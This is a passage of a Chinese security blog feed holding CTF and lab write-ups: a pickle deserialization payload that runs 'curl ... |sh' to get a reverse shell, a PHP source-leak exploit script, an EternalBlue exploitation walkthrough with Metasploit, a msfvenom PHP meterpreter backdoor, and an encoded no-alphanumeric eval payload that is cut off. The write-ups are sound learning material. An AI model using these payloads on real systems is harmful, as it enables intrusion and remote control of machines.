c.getDeclaredFields();</span></span><br><span class="line"><span class="comment">//        for (Field f:fields)</span></span><br><span class="line"><span class="comment">//         System.out.println(f);</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(person1,<span class="number">100</span>);</span><br><span class="line">        System.out.println(person1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用类里边的方法</span></span><br><span class="line"><span class="comment">//        Method[] method = c.getMethods();</span></span><br><span class="line"><span class="comment">//        for (Method m:method)</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(m);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//          Method method = c.getMethod(&quot;action&quot;, String.class);</span></span><br><span class="line"><span class="comment">//          method.invoke(person1,&quot;test&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;action&quot;</span>, String.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        method.invoke(person1,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上就是全部java反射的学习过程了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.bilibili.com/video/BV16h411z7o9?p=2&amp;amp;vd_source=bacfffe46b930fda5761b63367eb298c&quot;&gt;这里话是看这篇文章来进行学习的&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img </summary>
      
    
    
    
    
    <category term="java 反射" scheme="https://ke1nys.github.io/tags/java-%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>CCTF-web</title>
    <link href="https://ke1nys.github.io/posts/4faf042b.html"/>
    <id>https://ke1nys.github.io/posts/4faf042b.html</id>
    <published>2023-03-12T08:10:24.000Z</published>
    <updated>2023-04-06T06:48:36.144Z</updated>
    
    <content type="html"><![CDATA[<h2 id="考察的是python反序列化加session伪造"><a href="#考察的是python反序列化加session伪造" class="headerlink" title="考察的是python反序列化加session伪造"></a>考察的是python反序列化加session伪造</h2><p><img src="../images/image-20230312161118245.png" alt="image-20230312161118245"></p><p>题目给的提示是查看cookie</p><p>这道题用到的工具  <a href="https://github.com/Paradoxis/Flask-Unsign">flask-unsign</a></p><p>这道题的话是禁用了R指令   所以的话我们就不能使用<code>__reduce__</code>了，那么我们就得想其他的办法例如b,c指令集等等</p><p>这里的话可以参考这篇文章  <a href="https://zhuanlan.zhihu.com/p/89132768">python 反序列化</a></p><p>这里是先随便注册一下，然后拿到cookie</p><p><img src="../images/image-20230314211006068.png" alt="image-20230314211006068"></p><p>注册后去查看cookie</p><p>然后利用工具对cookie进行解码(flask)</p><p><img src="../images/image-20230314211102653.png" alt="image-20230314211102653"></p><p>解码后在拿userinfo里的东西拿去解码</p><p><img src="../images/image-20230314211249493.png" alt="image-20230314211249493"></p><p>解码后得到这两个关键信息，然后去上面给的文章里的payload进行修改</p><p><img src="../images/image-20230314211345239.png" alt="image-20230314211345239"></p><p><img src="../images/image-20230314211411148.png" alt="image-20230314211411148"></p><p>就是修改这两个地方</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;\x80\x03cuserinfo\nUser\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVcurl https://your-shell.com/ip:port |sh\nb.&#x27;</span></span><br></pre></td></tr></table></figure><p>然后对这个进行base64进行加密，并把加密后的结果替换掉userinfo里的东西，然后利用工具进行加密(这里的密钥是  CCTF)</p><p>然后去替换掉cookie，然后刷新访问个人信息，就能反弹shell到自己的服务器上了，记得要先进行监听</p><p>这里生成所有四位大写字母组成的字符串代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># 大写字母列表</span></span><br><span class="line">uppercase_letters = <span class="built_in">list</span>(string.ascii_uppercase)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成所有四位大写字母组成的字符串</span></span><br><span class="line">all_combinations = itertools.product(uppercase_letters, repeat=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印所有生成的字符串</span></span><br><span class="line"><span class="keyword">for</span> combination <span class="keyword">in</span> all_combinations:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(combination))</span><br></pre></td></tr></table></figure><h2 id="这道题是考察源码泄露"><a href="#这道题是考察源码泄露" class="headerlink" title="这道题是考察源码泄露"></a>这道题是考察源码泄露</h2><p>就是考察的这篇文章给出的漏洞  <a href="https://cn-sec.com/archives/1530845.html">PHP &lt;= 7.4.21远程源码泄露漏洞</a></p><p><strong>脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;219.219.61.234:49155&quot;</span></span><br><span class="line">path = <span class="string">&quot;/&quot;</span></span><br><span class="line"><span class="keyword">if</span> path == <span class="string">&quot;&quot;</span>:</span><br><span class="line">    path = <span class="string">&quot;/&quot;</span></span><br><span class="line">payload = <span class="string">f&quot;GET <span class="subst">&#123;path&#125;</span> HTTP/1.1\nHost: <span class="subst">&#123;host&#125;</span>\n\nGET /xxx.ccc HTTP/1.1\n\n&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    ip, port = host.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    ip = host</span><br><span class="line">    port = <span class="number">80</span></span><br><span class="line">s1 = socket.socket()</span><br><span class="line">s1.connect((ip, <span class="built_in">int</span>(port)))</span><br><span class="line">s1.send(payload.encode())</span><br><span class="line">text = s1.recv(<span class="number">4096</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(text)</span><br></pre></td></tr></table></figure><p>这里我是拿去kali跑的，因为pycharm跑不出来结果</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;考察的是python反序列化加session伪造&quot;&gt;&lt;a href=&quot;#考察的是python反序列化加session伪造&quot; class=&quot;headerlink&quot; title=&quot;考察的是python反序列化加session伪造&quot;&gt;&lt;/a&gt;考察的是python反序列化</summary>
      
    
    
    
    
    <category term="cumt-ctf-web final CCTF" scheme="https://ke1nys.github.io/tags/cumt-ctf-web-final-CCTF/"/>
    
  </entry>
  
  <entry>
    <title>渗透入门1</title>
    <link href="https://ke1nys.github.io/posts/67769678.html"/>
    <id>https://ke1nys.github.io/posts/67769678.html</id>
    <published>2023-03-09T11:51:17.000Z</published>
    <updated>2023-04-06T06:48:36.159Z</updated>
    
    <content type="html"><![CDATA[<p>渗透的第一步肯定是要进行信息收集了</p><p>那么我这这里就不多写了，这篇文章写的很全了  <a href="https://blog.csdn.net/MachineGunJoe/article/details/118769170">文章</a></p><p>这里补充一下c段的意思   <a href="https://www.cnblogs.com/renhaoblog/p/13026361.html">文章</a></p><p>这里利用<code>Metasploit framework</code>来进行永恒之蓝的复现，来实现一下对这个渗透工具的认识</p><h2 id="永恒之蓝复现"><a href="#永恒之蓝复现" class="headerlink" title="永恒之蓝复现"></a>永恒之蓝复现</h2><p>实验环境</p><p>攻击机 kali linux ,ip:172.22.81.160 </p><p>靶机 ：windows7  ip: 192.168.59.129</p><p><img src="../images/image-20230309210251701.png" alt="image-20230309210251701"></p><p>这里下的是win7的企业版</p><p><strong>1.这里首先第一步是得进行信息收集</strong></p><p>先扫一下端口</p><p>在kaili上使用nmap探测win7的端口信息：<strong>nmap 192.168.59.129 </strong>，可以看到该机器已开启445端口，当然也可以查看该445端口的banner信息，命令 <strong>nmap -sV -p445 192.168.59.129</strong></p><p><img src="../images/image-20230309212745990.png" alt="image-20230309212745990"></p><p>这里开启的445端口就是这个漏洞出现的关键了。</p><p>这里的nmap中 sV的意思</p><p><img src="../images/image-20230309212636248.png" alt="image-20230309212636248"></p><p>也就是  —&gt;  探测开放端口以确定服务/版本信息</p><p>想要查看其他的命令的话可以nmap -h</p><p><img src="../images/image-20230309213931076.png" alt="image-20230309213931076"></p><p>主机名和windows版本都能成功看到了</p><p><strong>2.使用kali自带的metasploit(msf)</strong></p><p>如果是初次使用，先输入<strong>msfconsole</strong>进入msf，然后键入<strong>search ms17_010</strong>，查询对应的模块</p><p><strong>第一步</strong></p><p><img src="../images/image-20230309214251838.png" alt="image-20230309214251838"></p><p><strong>第二步</strong></p><p><img src="../images/image-20230309214321075.png" alt="image-20230309214321075"></p><p>这里的话永恒之蓝漏洞就是ms17_010,所以我们search他，然后出来的命令有<code>exploit</code>和<code>auxiliary</code></p><p>exp的话是进行漏洞利用的</p><p>aux是是进行判断漏洞是否存在的(就是个辅助工具)</p><p><strong>3.探测是否存在永恒之蓝漏洞</strong></p><p>可以先探测一下该系统是否存在永恒之蓝漏洞，当然也可以批量扫描C段，上面有五个模块可以选择，扫描的话使用 auxiliary/scanner/smb/smb_ms17_010，因为里面包含了scanner，键入命令 <strong>use auxiliary/scanner/smb/smb_ms17_010</strong></p><p>查询该模块需要的参数，命令 <strong>show options</strong>，可以看到主要的参数是攻击的主机RHOSTS，设置参数：<strong>set rhosts 192.168.59.129</strong>【不分大小写】，再键入<strong>show options</strong> 即可查看是否成功赋值上，如果写错了可以选择unset rhosts来取消重新选择</p><p><img src="../images/image-20230309215018768.png" alt="image-20230309215018768"></p><p>这里的话是required上写的yes是必须的得添加的值</p><p>threds是线程的意思</p><p><strong>4.使用 run 或者 exploit 命令即可成功查询，可以看到，Host is likely VULNERABLE to MS17-010!【主机可能容易受到MS17-010的攻击!】，证明可能存在永恒之蓝漏洞，下面开始利用</strong></p><p><img src="../images/image-20230309215259140.png" alt="image-20230309215259140"></p><p><strong>5.漏洞利用</strong></p><p>那么我们就可以进行漏洞利用了，就是使用expolit</p><p><img src="../images/image-20230309215405622.png" alt="image-20230309215405622"></p><p>win7需要使用exploit/windows/smb/ms17_010_eternalblue</p><p>windows2003使用exploit/windows/smb/ms17_010_psexec</p><p>所以我直接<strong>use exploit/windows/smb/ms17_010_eternalblue</strong></p><p><img src="../images/image-20230309215644933.png" alt="image-20230309215644933"></p><p><img src="../images/image-20230309215658099.png" alt="image-20230309215658099"></p><p>设置完成后，我们就可以开始run了</p><p><strong>6.开始run</strong></p><p><img src="../images/image-20230309215807989.png" alt="image-20230309215807989"></p><p>成功了，拿到<strong>meterpreter</strong>的话就是成功拿下目标机器了</p><p><img src="../images/image-20230309215904446.png" alt="image-20230309215904446"></p><p>我们可以输入？来查看其他命令，然后利用这些命令来进行命令执行。</p><p>输入shell的话就是可以拿到目标机器的cmd了</p><p><img src="../images/image-20230309220109374.png" alt="image-20230309220109374"></p><p>想对目标机器干啥就直接去看？给出的指令了。</p><p>对win7输入netstat -an指令的话，就可以看到本地的64392端口被192.168.3.110：4444监听，反弹shell成功</p><p><img src="../images/image-20230309220254984.png" alt="image-20230309220254984"></p><p>至此  永恒之蓝漏洞就复现成功了，那么我们对msf也有一点了解了。</p><p>nmap -sn -PE -n 172.22.81.1/24 -oX out.xml    —&gt;   这就是扫c段的</p><p>  -sn 不扫描端口            -PE <a href="https://so.csdn.net/so/search?q=ICMP&amp;spm=1001.2101.3001.7020">ICMP</a>扫描</p><p>   -n不进行<a href="https://so.csdn.net/so/search?q=dns解析&amp;spm=1001.2101.3001.7020">dns解析</a>           -oX 输出结果</p><h3 id="利用Msfvenom写入后门"><a href="#利用Msfvenom写入后门" class="headerlink" title="利用Msfvenom写入后门"></a>利用Msfvenom写入后门</h3><p>msfvenom a Metasploit standalone payload generator，Also a replacement for msfpayload and msfencode.是用来生成后门的软件。<br>MSFvenom是Msfpayload和Msfencode的组合，将这两个工具都放在一个Framework实例中。自2015年6月8日起，msfvenom替换了msfpayload和msfencode。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">-l, --<span class="keyword">list</span> &lt;type&gt; 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops,......all</span><br><span class="line"> </span><br><span class="line">-p, --payload &lt; payload&gt; 指定需要使用的<span class="title function_ invoke__">payload</span>(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的</span><br><span class="line"> </span><br><span class="line">-f, --format &lt; format&gt; 指定输出格式</span><br><span class="line"> </span><br><span class="line">-e, --encoder &lt;encoder&gt; 指定需要使用的encoder（编码器），指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload</span><br><span class="line"> </span><br><span class="line">-a, --arch &lt; architecture&gt; 指定payload的目标架构，例如x86 还是 x64 还是 x86_64</span><br><span class="line"> </span><br><span class="line">-o, --out &lt; path&gt; 指定创建好的payload的存放位置</span><br><span class="line"> </span><br><span class="line">-b, --bad-chars &lt; <span class="keyword">list</span>&gt; 设定规避字符集，指定需要过滤的坏字符。例如：不使用 <span class="string">&#x27;\x0f&#x27;</span>、<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"> </span><br><span class="line">-n, --nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度</span><br><span class="line"> </span><br><span class="line">-s, --space &lt; length&gt; 设定有效攻击荷载的最大长度，就是文件大小</span><br><span class="line"> </span><br><span class="line">-i, --iterations &lt; count&gt; 指定payload的编码次数</span><br><span class="line"> </span><br><span class="line">-c, --add-code &lt; path&gt; 指定一个附加的win32 shellcode文件</span><br><span class="line"> </span><br><span class="line">-x, --template &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中</span><br><span class="line"> </span><br><span class="line">-k, --keep 保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line"> </span><br><span class="line">-v, --<span class="keyword">var</span>-name &lt; value&gt; 指定一个自定义的变量，以确定输出格式</span><br><span class="line"> </span><br><span class="line">-t, --timeout &lt;second&gt; 从stdin读取有效负载时等待的秒数（默认为<span class="number">30</span>，<span class="number">0</span>表示禁用）</span><br><span class="line"> </span><br><span class="line">-h,--help 查看帮助选项</span><br><span class="line"> </span><br><span class="line">--platform &lt; platform&gt; 指定payload的目标平台</span><br></pre></td></tr></table></figure><p>这里的话这些命令的话不用记得，多用几次命令就熟悉了</p><p>这里的话先查看一下哪些后门工具可以进行利用</p><p><code>msfvenom -l payload | grep &#39;windows&#39; | awk &#39;&#123;print $1&#125;&#39;</code></p><p>grep —&gt;  是linux中的文本匹配语句  这里就是输出有windows的payload</p><p>awk  —&gt;是文本打印工具  <a href="https://www.cnblogs.com/ggjucheng/archive/2013/01/13/2858470.html">awk</a></p><p><img src="../images/image-20230310161327640.png" alt="image-20230310161327640"></p><p>就会出现一堆payload，那么我们就可以从中选一个进行利用</p><p>这里我们选一个php的payload，这里的话因为是靶机的话，然后没有一些编程语言环境的话，payload到那边是执行不了的(我们在靶机上就得构建一个phpstudy来执行这个生成的后门代码)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp lhost=<span class="number">172.29</span>.<span class="number">76.20</span> lport=<span class="number">5555</span> -f raw &gt;a.php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230310162542496.png" alt="image-20230310162542496"></p><p>成功生成了php的代码，那么我们就把生成的php代码复制到靶机上</p><p>这里话得在win7靶机上安装phpstudy和<a href="https://segmentfault.com/a/1190000040641247">补丁</a>  补丁是为了成功安装vmtools</p><p>好把a.php拖进去(拖到www目录下)</p><p><img src="../images/image-20230310170804761.png" alt="image-20230310170804761"></p><p>成功托进去</p><p>在执行a.php文件之前  我们得在kali攻击机上开启监听</p><p><img src="../images/image-20230310171148353.png" alt="image-20230310171148353"></p><p>使用监听模块进行监听</p><p><code>use exploit/multi/handler</code></p><p><code>set payload php/meterpreter_reverse_tcp</code></p><p>因为我们是使用php/meterpreter_reverse_tcp写的后门，那么我们监听的话还是得用它</p><p>这里的<code>reverse_tcp</code>和<code>reverse_http</code>的区别是，tcp能指定任意端口，http只能指定80端口</p><p><img src="../images/image-20230310171433064.png" alt="image-20230310171433064"></p><p><img src="../images/image-20230310171801516.png" alt="image-20230310171801516"></p><p><img src="../images/image-20230310171816219.png" alt="image-20230310171816219"></p><p>在靶机上访问a.php的时候，kali监听就拿到了meterpreter了。</p><p>上面我们使用的php是属于web的payload,那么我们也可以使用脚本payload来进行拿meterpreter</p><p>这篇文章进行了很好的补充  —-&gt;   <a href="https://blog.csdn.net/qq_48985780/article/details/121441548">文章</a></p><p>上面是传的php代码，接下来我们来传exe文件</p><p>利用msf攻击windows  就是留下后门</p><p>这里的利用webshell的意思是当靶机存在命令执行或者远程漏洞执行漏洞时，我们可以进行利用，从而拿下靶机的控制权</p><p>这里利用的是web_delivery</p><p><img src="../images/image-20230310180232793.png" alt="image-20230310180232793"></p><p><img src="../images/image-20230310180529065.png" alt="image-20230310180529065"></p><p>这里使用的是php反弹shell脚本 </p><p>和上面生成的a.php是一个意思</p><p>这里生成了一个php代码  然后我们复制之后拿去ping  当然是不能成功的，因为就是靶机没有php的环境变量，所以不能执行php代码</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;渗透的第一步肯定是要进行信息收集了&lt;/p&gt;
&lt;p&gt;那么我这这里就不多写了，这篇文章写的很全了  &lt;a href=&quot;https://blog.csdn.net/MachineGunJoe/article/details/118769170&quot;&gt;文章&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里补</summary>
      
    
    
    
    
    <category term="渗透入门1" scheme="https://ke1nys.github.io/tags/%E6%B8%97%E9%80%8F%E5%85%A5%E9%97%A81/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-常用姿势 刷题记录</title>
    <link href="https://ke1nys.github.io/posts/66e9d03e.html"/>
    <id>https://ke1nys.github.io/posts/66e9d03e.html</id>
    <published>2023-03-03T11:49:15.000Z</published>
    <updated>2023-03-08T13:01:11.219Z</updated>
    
    <content type="html"><![CDATA[<p>这里包括多种类型的题目  为常见的姿势  用于积累自己的方法库</p><h2 id="web801-flask算pin"><a href="#web801-flask算pin" class="headerlink" title="web801(flask算pin)"></a>web801(flask算pin)</h2><p>题目</p><p><img src="../images/image-20230303200038182.png" alt="image-20230303200038182"></p><p><strong>条件: flask debug模式开启 存在任意文件读取</strong></p><p>这里的话是python版本的不同，那么计算pin码的脚本也是不相同的，原因就在于加密方式不相同。</p><p>python3.6是MD5加密，python3.8是sha1加密</p><p><a href="https://blog.csdn.net/weixin_54648419/article/details/123632203">详细的wp </a>这篇文章写的非常详细了，我这里就不写了。</p><h2 id="web802-无字母数字命令执行"><a href="#web802-无字母数字命令执行" class="headerlink" title="web802( 无字母数字命令执行)"></a>web802( <strong>无字母数字命令执行</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里话网上有很多种方法来进行这个绕过，这里就不多赘述了</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">5</span>B%<span class="number">5</span>D%<span class="number">2</span>E%<span class="number">27</span>%<span class="number">27</span>%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>B%<span class="number">27</span>%<span class="number">27</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">27</span>%<span class="number">24</span>%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">27</span>%<span class="number">5</span>F%<span class="number">27</span>%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>E%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>E%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span 